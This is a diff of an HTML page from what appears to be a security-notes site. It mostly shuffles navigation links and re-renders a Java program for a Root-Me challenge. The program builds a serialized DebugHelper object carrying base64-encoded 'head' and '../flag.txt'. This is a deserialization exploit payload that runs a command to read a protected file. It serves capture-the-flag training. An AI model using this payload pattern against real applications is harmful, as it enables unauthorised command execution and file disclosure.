@@ -318,19 +318,15 @@
       <ul class="list-unstyled list-nested">
 
   <li>
-      <a href="/notes/web/access-control/">Access Control</a>
-  </li>
-
-  <li>
-      <a href="/notes/web/api-testing/">API Testing</a>
-  </li>
-
-  <li>
-      <a href="/notes/web/authentication/">Authentication</a>
-  </li>
-
-  <li>
       <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/cors/">Cors</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/csrf/">CSRF</a>
   </li>
 
   <li class="active" >
@@ -355,10 +351,6 @@
 
   <li>
       <a href="/notes/web/path-traversal/">Path Traversal</a>
-  </li>
-
-  <li>
-      <a href="/notes/web/race-conditon/">Race Conditon</a>
   </li>
 
   <li>
@@ -604,6 +596,10 @@
     <details>
       <summary>Dev</summary>
       <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/asm/">ASM</a>
+  </li>
 
   <li>
       <a href="/notes/code/bash/">Bash</a>
@@ -998,19 +994,15 @@
       <ul class="list-unstyled list-nested">
 
   <li>
-      <a href="/notes/web/access-control/">Access Control</a>
-  </li>
-
-  <li>
-      <a href="/notes/web/api-testing/">API Testing</a>
-  </li>
-
-  <li>
-      <a href="/notes/web/authentication/">Authentication</a>
-  </li>
-
-  <li>
       <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/cors/">Cors</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/csrf/">CSRF</a>
   </li>
 
   <li class="active" >
@@ -1035,10 +1027,6 @@
 
   <li>
       <a href="/notes/web/path-traversal/">Path Traversal</a>
-  </li>
-
-  <li>
-      <a href="/notes/web/race-conditon/">Race Conditon</a>
   </li>
 
   <li>
@@ -1286,6 +1274,10 @@
       <ul class="list-unstyled list-nested">
 
   <li>
+      <a href="/notes/code/asm/">ASM</a>
+  </li>
+
+  <li>
       <a href="/notes/code/bash/">Bash</a>
   </li>
 
@@ -1398,51 +1390,51 @@
 
 
 <div class="expressive-code">
-  <figure class="frame not-content">
+  <figure class="frame is-terminal not-content">
   <figcaption class="header">
     <span class="title"></span>
   </figcaption>
-  <pre tabindex="0"><code>package com.rootme.serial;
-
-import java.io.*;
-import java.nio.charset.StandardCharsets;
-import com.rootme.serial.OwnBase64;
-import java.io.ByteArrayOutputStream;
-import java.io.ObjectOutputStream;
-import java.util.Base64;
-
-public class Main {
-
-    public static void main(String[] args) {
-        try {
-        // Créer un tableau OwnBase64 avec la commande encodée
-        OwnBase64[] encodedCommand = { new OwnBase64(&#34;aGVhZA==&#34;), new OwnBase64(&#34;Li4vZmxhZy50eHQ=&#34;) };
-
-        DebugHelper debugHelper = new DebugHelper(encodedCommand, Boolean.TRUE);
-
-        String serializedObject = serialize(debugHelper);
-        System.out.println(&#34;Serialized object: &#34; + serializedObject);
-
-        } catch (Exception e) {
-            System.err.println(&#34;An error occurred during serialization/deserialization: &#34; + e.getMessage());
-            e.printStackTrace();
-        }
-    }
-
-    public static String serialize(Object item) {
-        final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-        final ObjectOutputStream objectOutputStream;
-        try {
-            objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
-            objectOutputStream.writeObject(item);
-            objectOutputStream.close();
-            byte[] bytes = Base64.getEncoder().encode(byteArrayOutputStream.toByteArray());
-            return new String(bytes, StandardCharsets.US_ASCII);
-        } catch (IOException e) {
-            throw new Error(e);
-        }
-    }
-}</code></pre>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">package com.rootme.serial<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">import java.io.*<span class="p">;</span>
+</span></span><span class="line"><span class="cl">import java.nio.charset.StandardCharsets<span class="p">;</span>
+</span></span><span class="line"><span class="cl">import com.rootme.serial.OwnBase64<span class="p">;</span>
+</span></span><span class="line"><span class="cl">import java.io.ByteArrayOutputStream<span class="p">;</span>
+</span></span><span class="line"><span class="cl">import java.io.ObjectOutputStream<span class="p">;</span>
+</span></span><span class="line"><span class="cl">import java.util.Base64<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">public class Main <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public static void main<span class="o">(</span>String<span class="o">[]</span> args<span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        try <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        // Créer un tableau OwnBase64 avec la commande encodée
+</span></span><span class="line"><span class="cl">        OwnBase64<span class="o">[]</span> <span class="nv">encodedCommand</span> <span class="o">=</span> <span class="o">{</span> new OwnBase64<span class="o">(</span><span class="s2">&#34;aGVhZA==&#34;</span><span class="o">)</span>, new OwnBase64<span class="o">(</span><span class="s2">&#34;Li4vZmxhZy50eHQ=&#34;</span><span class="o">)</span> <span class="o">}</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        DebugHelper <span class="nv">debugHelper</span> <span class="o">=</span> new DebugHelper<span class="o">(</span>encodedCommand, Boolean.TRUE<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        String <span class="nv">serializedObject</span> <span class="o">=</span> serialize<span class="o">(</span>debugHelper<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        System.out.println<span class="o">(</span><span class="s2">&#34;Serialized object: &#34;</span> + serializedObject<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> catch <span class="o">(</span>Exception e<span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            System.err.println<span class="o">(</span><span class="s2">&#34;An error occurred during serialization/deserialization: &#34;</span> + e.getMessage<span class="o">())</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            e.printStackTrace<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public static String serialize<span class="o">(</span>Object item<span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        final ByteArrayOutputStream <span class="nv">byteArrayOutputStream</span> <span class="o">=</span> new ByteArrayOutputStream<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        final ObjectOutputStream objectOutputStream<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        try <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">objectOutputStream</span> <span class="o">=</span> new ObjectOutputStream<span class="o">(</span>byteArrayOutputStream<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            objectOutputStream.writeObject<span class="o">(</span>item<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            objectOutputStream.close<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            byte<span class="o">[]</span> <span class="nv">bytes</span> <span class="o">=</span> Base64.getEncoder<span class="o">()</span>.encode<span class="o">(</span>byteArrayOutputStream.toByteArray<span class="o">())</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> new String<span class="o">(</span>bytes, StandardCharsets.US_ASCII<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> catch <span class="o">(</span>IOException e<span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            throw new Error<span class="o">(</span>e<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></div>
   </figure>
 </div>
 
